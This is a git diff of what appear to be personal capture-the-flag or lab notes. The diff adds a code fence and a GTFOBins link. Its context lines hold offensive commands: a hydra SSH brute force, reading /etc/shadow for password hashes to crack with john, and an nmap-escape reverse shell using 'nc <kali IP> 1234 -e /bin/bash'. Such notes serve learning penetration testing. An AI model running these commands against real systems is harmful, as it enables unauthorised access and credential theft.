@@ -26,6 +26,7 @@ hydra -l marlinspike -P /usr/share/wordlists/john/lst 2.0.0.22 ssh -e nsr -t 4
 - anothe way to know the password is
 ```bash
 cat /etc/shadow - contails passowrd hashes
+```
 - copy the hashes in a file in kali and try john
 ```bash
 nano hash.txt
@@ -50,3 +51,5 @@ nmap> ! nc <kali IP> 1234 -e /bin/bash
 nc -lvp 1234    
 ```
 - GTFOBINS is helpful to find the suid files and how to use them to escalate the privileges
+Gtfobins link: https://gtfobins.com/
+
